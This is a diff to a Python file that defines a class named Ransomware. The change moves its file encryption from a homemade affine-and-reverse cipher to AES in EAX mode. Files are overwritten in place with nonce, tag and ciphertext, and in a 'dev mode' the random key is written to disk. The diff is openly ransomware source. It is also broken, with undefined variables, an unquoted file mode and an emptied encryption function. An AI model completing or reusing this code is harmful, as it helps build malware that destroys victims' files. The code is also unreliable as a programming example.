@@ -2,6 +2,9 @@ import os
 import os.path
 from os import listdir
 from os.path import isfile, join
+from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
+
 
 from AffineCipher import *
 from ReverseCipher import *
@@ -17,43 +20,40 @@ Debug messages along with any code that doesn't work/isn't being used has been c
 
 class Ransomware(object):
 
-    def __init__(self, key, dev_mode):
-        self.key = key
-        self.dev_mode = True
-
+    def __init__(self, dev_mode):
+        self.dev_mode = dev_mode
+        self.key = get_random_bytes(16)
+        if dev_mode == True:
+            with open("AES_key.txt", w) as f:
+                f.write(key)
+                f.close()
+            
 
     ######## Encryption functions ######## 
 
-    # TODO: Switch to AES-256 encryption  
-    def perform_encryption(self, key, message):
-        reverse = ReverseCipher()
-        affine = AffineCipher()
+    def perform_encryption(self, message):
+        
 
-        # Round 1: Affine (Substitution)
-        # Round 2: Reverse (Transposition)
-        round1 = affine.encryptMessage(key, message) 
-        round2 = reverse.reverse(rnd1_message) 
-        ciphertext = round2
-
-        return ciphertext
+        return ciphertext, tag
 
     def encrypt_file(self, filename):
+        aes_cipher = AES.new(key, AES.MODE_EAX)
         # Open file as Read-Binary, read its contents and store in f_contents
         with open(filename, 'rb') as f:
             f_contents = f.read()
-        encrypted_contents = self.perform_encryption(self.key, f_contents)
+        ciphertext, tag = cipher.encrypt_and_digest(f_contents)
         f.close()
 
         # Save encrypted contents to file
         with open(filename, 'wb') as f:
-            f.write(encrypted_contents)
+            [ f.write(x) for x in (cipher.nonce, tag, ciphertext) ]
             f.close()
 
     def encrypt_files(self):
         list_of_files = self.get_list_of_files() 
 
         for each_file in list_of_files:
-            self.encrypt_specified_file(each_file)
+            self.encrypt_file(each_file)
     
 
     ######## Decryption functions ######## 
@@ -90,7 +90,7 @@ class Ransomware(object):
 
         # Decrypt every file in the list individually 
         for each_file in list_of_files:
-            self.decrypt_specified_file(each_file)            
+            self.decrypt_file(each_file)            
 
     
     ######## Helper functions ######## 
